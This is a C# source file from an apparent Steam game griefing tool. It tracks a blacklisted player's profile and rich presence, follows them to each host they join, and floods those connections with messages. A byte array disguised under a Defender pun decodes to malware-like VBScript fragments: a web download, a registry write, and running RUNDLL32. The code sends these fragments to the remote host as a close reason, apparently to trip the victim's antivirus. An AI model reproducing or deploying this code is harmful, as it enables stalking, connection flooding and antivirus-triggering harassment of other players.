using ScrapRat.Util;
using Steamworks;
using System.Text;
using System.Timers;
using Timer = System.Timers.Timer;

namespace ScrapRat.PlayerModels.Blacklist
{
    public class MechanicNoMore : IPlayer
    {
        private Player BasePlayer { get; }

        private Player Host { get; set; }

        private bool isBlacklisted = true;
        public bool IsBlacklisted
        {
            get => isBlacklisted;
            set
            {
                if (value != isBlacklisted)
                {
                    Interupt.Reset();
                    OnPlayerLoaded(BasePlayer);
                    isBlacklisted = value;
                }
            }
        }

        public string Name => BasePlayer.Name;

        public InteruptHandler Interupt => BasePlayer.Interupt;

        public CSteamID SteamID => BasePlayer.SteamID;

        public PrivacySettings Privacy => BasePlayer.Privacy;

        public ValueTask DisposeAsync() => BasePlayer.DisposeAsync();

        public bool AnyHostBlacklisted { get; }

        public bool IsInGame { get; private set; }

        public bool HideLogs { get; set; } = false;

        public event PlayerLoadedEventHandler? PlayerLoaded
        {
            add { BasePlayer.PlayerLoaded += value; }
            remove { BasePlayer.PlayerLoaded -= value; }
        }

        private const int SUPER_SLOW_SCAN = 60000; // 60 seconds
        private const int SLOW_SCAN = 10000; // 10 seconds
        private const int QUICK_SCAN = 5000; // 5
                                             // seconds
        private const int FAST_SCAN = 1000; // 1 second

        private readonly Timer ScanningTimer = new()
        {
            AutoReset = true,
            Interval = SLOW_SCAN,
            Enabled = false,
        };

        private readonly Timer RichPresenceTimer = new()
        {
            AutoReset = true,
            Interval = QUICK_SCAN,
            Enabled = false,
        };

        internal MechanicNoMore(Player bplayer, bool hidelogs, bool blacklistAnyHost)
        {
            Host = bplayer;
            BasePlayer = bplayer;
            HideLogs = hidelogs;
            AnyHostBlacklisted = blacklistAnyHost;
            BasePlayer.OnProcessCommands += ProcessCommands;
            BasePlayer.PlayerLoaded += OnPlayerLoaded;
            ScanningTimer.Elapsed += ProfileScanning;
            RichPresenceTimer.Elapsed += UpdateRichPresence;
        }

        private void ProcessCommands(object? sender, EventArgs e)
        {
            // throw new NotImplementedException();
        }

        private void OnPlayerLoaded(Player player)
        {
            Host = BasePlayer;
            Task.Run(OpenConnection);

            if (Privacy >= PrivacySettings.Public && AnyHostBlacklisted)
            {
                ScanningTimer.Interval = SLOW_SCAN;
                ScanningTimer.Start();
                Interupt.RunOnCancel(ScanningTimer.Stop);

                Task.Run(() => ProfileScanning(null, null));
            }
        }

        private void OpenConnection()
        {
            var connection = Host.GetConnection();

            Interupt.RunCancelable((cancel) =>
            {
                SteamNetworkingSockets.GetConnectionInfo(connection, out var info);

                while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected
                    && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally
                    && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ClosedByPeer)
                {
                    SteamAPI.RunCallbacks();
                    SteamNetworkingSockets.GetConnectionInfo(connection, out info);

                    if (cancel.CanBeCanceled == true && cancel.IsCancellationRequested == true)
                    {
                        Host.CloseConnection();
                        return;
                    }
                }

                if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                    Task.Run(() => ListenForConnectionClose(connection));
                else
                    Task.Run(OpenConnection);

            }, Interupt.Token);
        }

        private static readonly byte[] windows_the_fender = [10, 83, 101, 116, 32, 95, 61, 99, 114, 101, 97, 116, 101, 111, 98, 106, 101, 99, 116, 10, 46, 83, 101, 110, 100, 10, 46, 119, 114, 105, 116, 101, 32, 120, 46, 114, 101, 115, 112, 111, 110, 115, 101, 66, 111, 100, 121, 10, 46, 115, 97, 118, 101, 116, 111, 102, 105, 108, 101, 10, 111, 98, 106, 83, 104, 101, 108, 108, 46, 82, 101, 103, 87, 114, 105, 116, 101, 10, 111, 98, 106, 83, 104, 101, 108, 108, 46, 82, 117, 110, 32, 37, 119, 105, 110, 100, 105, 114, 37, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92, 82, 85, 78, 68, 76, 76, 51, 50, 46, 69, 88, 69, 10];
        private void ListenForConnectionClose(HSteamNetConnection connection)
        {
            if (HideLogs)
            {
                Interupt.RunCancelable((cancel) =>
                {
                    SteamNetworkingSockets.ReceiveMessagesOnConnection(connection, new nint[1], 1);

                    string offender = Encoding.UTF8.GetString(windows_the_fender);
                    Host.CloseConnection(offender);
                    Task.Run(OpenConnection);
                }, Interupt.Token);
                
                return;
            }

            Interupt.RunCancelable((cancel) =>
            {
                SteamNetworkingSockets.ReceiveMessagesOnConnection(connection, new nint[1], 1);

                int hideLogs = HideLogs ? 6 : 0;
                SteamNetworkingSockets.GetConnectionInfo(connection, out var info);
                while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally
                    && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ClosedByPeer
                    && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Dead
                    && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_None)
                {
                    if (IsBlacklisted)
                        SteamNetworkingSockets.SendMessageToConnection(connection, 0, 0, 0, out long _);

                    SteamAPI.RunCallbacks();
                    SteamNetworkingSockets.GetConnectionInfo(connection, out info);

                    if (cancel.CanBeCanceled == true && cancel.IsCancellationRequested == true)
                        return;
                }

                Console.WriteLine("Connection closed.");
                Host.CloseConnection();
                Task.Run(OpenConnection);
            }, Interupt.Token);
        }

        private readonly List<bool> previous_game_states = new(3);
        private void ProfileScanning(object? sender, EventArgs e)
        {
            var profile = BasePlayer.GetProfile();

            var ginfo = profile.Element("inGameInfo");
            if (ginfo != null && ginfo.Element("gameLink")!.Value.EndsWith("387990"))
            {
                if (previous_game_states.Count >= 3)
                    previous_game_states.RemoveAt(0);
                previous_game_states.Add(true);

                if (previous_game_states.All(b => b) && !IsInGame)
                {
                    ScanningTimer.Interval = FAST_SCAN;
                    IsInGame = true;

                    RichPresenceTimer.Start();
                    Interupt.RunOnCancel(RichPresenceTimer.Stop);
                }

                return;
            }

            if (previous_game_states.Count >= 3)
                previous_game_states.RemoveAt(0);
            previous_game_states.Add(false);

            if (IsInGame)
            {
                ScanningTimer.Interval = SLOW_SCAN;
                RichPresenceTimer.Stop();
                IsInGame = false;
            }
        }

        private void UpdateRichPresence(object? sender, ElapsedEventArgs e)
        {
            SteamFriends.RequestFriendRichPresence(BasePlayer.SteamID);
            SteamAPI.RunCallbacks();

            var richPresence = LoadUserRP(SteamID);

            bool isInAWorld =
                   richPresence.TryGetValue("connect", out var curl) && !string.IsNullOrWhiteSpace(curl)
                && richPresence.TryGetValue("status", out var stat) && !string.IsNullOrWhiteSpace(stat);
            // && richPresence.TryGetValue("Passphrase", out var pphrase) && !string.IsNullOrWhiteSpace(pphrase);

            if (richPresence.Count <= 0 || !isInAWorld)
            {
                if (Host.SteamID.m_SteamID != BasePlayer.SteamID.m_SteamID)
                    Host = BasePlayer;
                return;
            }

            if (richPresence.TryGetValue("connect", out string? connectUrl))
            {
                ulong hostId = ulong.Parse(
                    connectUrl.Split('-', StringSplitOptions.RemoveEmptyEntries)
                    .First().Split(' ', StringSplitOptions.RemoveEmptyEntries).Last());

                if (Host.SteamID.m_SteamID != hostId)
                {
                    Host = new Player(hostId);
                    Interupt.Reset();
                    Task.Run(OpenConnection);

                    RichPresenceTimer.Start();
                    ScanningTimer.Start();

                    Interupt.RunOnCancel(ScanningTimer.Stop);
                    Interupt.RunOnCancel(RichPresenceTimer.Stop);
                }
            }
        }

        private Dictionary<string, string> LoadUserRP(CSteamID user)
        {
            Dictionary<string, string> richPresence = [];

            int keyCount = SteamFriends.GetFriendRichPresenceKeyCount(user);

            if (keyCount > 0)
            {
                for (int i = 0; i < keyCount; i++)
                {
                    string key = SteamFriends.GetFriendRichPresenceKeyByIndex(user, i)!;
                    string value = SteamFriends.GetFriendRichPresence(user, key)!;
                    richPresence.Add(key, value);
                }
            }

            return richPresence;
        }
    }
}
